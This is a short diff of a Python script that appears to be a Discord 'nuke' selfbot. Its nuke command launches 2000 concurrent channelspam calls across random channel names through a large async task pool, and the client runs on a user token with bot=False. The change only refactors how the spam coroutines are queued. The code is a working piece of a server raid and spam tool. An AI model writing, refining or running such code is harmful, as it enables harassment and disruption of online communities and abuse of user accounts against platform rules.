@@ -73,7 +73,7 @@ async def nuke(ctx):
     async with httpx.AsyncClient() as session:
         async with TaskPool(6000) as tasks:
             for _i in range(2000):
-                await tasks.put(asyncio.create_task(channelspam(random.choice(channel_names), session)))
+                await tasks.put(channelspam(random.choice(channel_names), session))
 
 
 thugz.run(token, bot=False)
